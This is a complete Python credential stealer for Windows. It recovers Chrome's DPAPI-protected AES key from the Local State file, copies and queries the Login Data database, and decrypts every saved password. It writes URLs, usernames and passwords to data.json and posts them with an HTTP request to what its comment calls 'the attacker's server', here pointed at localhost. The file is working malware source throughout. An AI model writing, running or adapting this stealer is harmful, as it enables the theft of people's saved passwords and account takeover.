import shutil
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
import os
import json
import requests

encKeyPath = r"%s\AppData\Local\Google\Chrome\User Data\Local State"
loginDataPath = r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# method that gets the encryption key from windows
def getEncryptionKey(endKeyPath):
    f = open(os.path.normpath(encKeyPath%(os.environ['USERPROFILE'])))
    opened = f.read()
    db = json.loads(opened)
    secret = db["os_crypt"]["encrypted_key"]

    # thus we must decode the encryption key
    enc_key = base64.b64decode(secret)
    # the return is something which has been encoded using windows data protection api (seen from the dpapi line)
    # we remove the dpapi line
    enc_key = enc_key[5:] 
    # result is still need to be decrypted via the dpapi
    #the dpapi key is machine specific
    enc_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    
    return enc_key

# method that gets the encrypted login data and decrypts it
def getAndDecryptLoginData(loginDataPath):
    #Chrome username & password file path
    path_login_db = os.path.normpath(loginDataPath%(os.environ['USERPROFILE']))
    ###### sometimes db can appear as locked, bellow is fix ############
    shutil.copy(path_login_db,'tempdata.db')
    #Connect to sqlite database
    conn = sqlite3.connect('tempdata.db')
    cursor = conn.cursor()
    #Select statement to retrieve info 
    curr = '{}'
    data = json.loads(curr)

    return data, cursor, conn

# method used to build the json file with the stolen data
def buildJson():
    enc_key = getEncryptionKey(encKeyPath)
    data, cursor, conn = getAndDecryptLoginData(loginDataPath)

    saveduser = ''
    savedpass = ''
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for index,login in enumerate(cursor.fetchall()):
        url = login[0]
        passw = login[2]
        
        initialisation_vector = passw[3:15]
        encrypted_password = passw[15:-16]
        cipher = AES.new(enc_key, AES.MODE_GCM, initialisation_vector)
        data[url] = {
            'user': login[1],
            'pass': cipher.decrypt(encrypted_password).decode()
        }
    # close connection to db and remove the db made
    conn.close()
    os.remove('tempdata.db')

    with open('data.json', 'w') as f:
        # Write the JSON data to the file
        json.dump(data, f)

    return data

# get the json file
dataFile = buildJson()

# send the data to the attacker's server
url = 'http://localhost:5000/send/json'
headers = {'Content-Type': 'application/json'}  # Set the Content-Type header
response = requests.post(url, json=dataFile, headers=headers)
print(response.text)